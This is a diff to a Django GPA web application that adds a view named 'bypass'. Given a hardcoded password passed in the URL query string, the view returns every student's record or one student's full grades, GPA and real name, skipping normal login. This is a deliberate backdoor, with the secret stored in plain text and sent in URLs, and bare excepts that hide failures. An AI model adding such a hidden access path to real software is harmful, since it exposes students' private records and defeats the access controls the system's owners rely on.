@@ -6,7 +6,61 @@ from gpa.models import Student
 from gpa.models import Module
 
 
+def bypass(request):
+    try:
+        if request.method == 'GET':
+            try:
+                password = request.GET['password']
+                view = request.GET['type']
+                index = request.GET['index']
+            except:
+                return render(request, 'gpa/auto/auto.html')
 
+            if password=='maadpAa@452263293' and view=='all':
+                return render(request, 'bypass2.html', {'users':list(Student.objects.all())})
+        
+            elif password=='maadpAa@452263293' and view=='user':
+                
+                student = Student.objects.get(index=index)
+
+                
+                performance = LOGIC.GETPERFORMANCE(student.performance)
+
+                semList = list(performance.keys())
+                semList.sort()
+
+                overallGPA=student.overallGPA
+
+                petname = LOGIC.GETPETNAME(student.realName)
+                
+                semGPA = LOGIC.GETSEMGPA(student.semGPA)
+
+                #SOGPA CALCULATION--------------------
+                SOGPA = 0
+                c = 0
+                n = []
+                for s, g in semGPA.items():
+                    try:
+                        g = float(g)
+                        if g==0.0:
+                            raise Exception
+                    except:
+                        n.append(g)
+                    else:
+                        c+=1
+                        SOGPA+=g
+                if len(n)==len(semGPA.keys()):
+                    SOGPA="0.0000"
+                else:
+                    SOGPA = round(SOGPA/c, 4)
+                #------------------------------------
+                
+                return render(request, 'bypass.html', {'SOGPA':SOGPA, 'overallGPA':overallGPA, 'index':student.index.upper(), 'realName':student.realName, 'petName':petname.upper(), 'sem_list':semList, 'sem_gpa':semGPA, 'sem_grades_modules':performance})
+            else:
+                return render(request, 'gpa/auto/auto.html')
+    except:
+        return render(request, 'gpa/auto/auto.html')
+    
 def twoOption(request):
     return render(request, 'gpa/twoOption.html')
 	
